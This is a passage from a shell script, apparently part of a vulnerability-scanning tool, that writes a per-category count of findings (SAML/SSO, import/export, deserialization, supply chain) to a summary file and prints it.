    echo "SAML/SSO Findings    : $(count_vuln "$FINDINGS_DIR/saml/findings.txt")"
    echo "Import/Export        : $(count_vuln "$FINDINGS_DIR/import_export/endpoints.txt")"
    echo "Deserialization      : $(count_vuln "$FINDINGS_DIR/deserialize/findings.txt")"
    echo "Supply Chain         : $(count_vuln "$FINDINGS_DIR/supply_chain/findings.txt")"
} > "$FINDINGS_DIR/summary.txt"
cat "$FINDINGS_DIR/summary.txt"
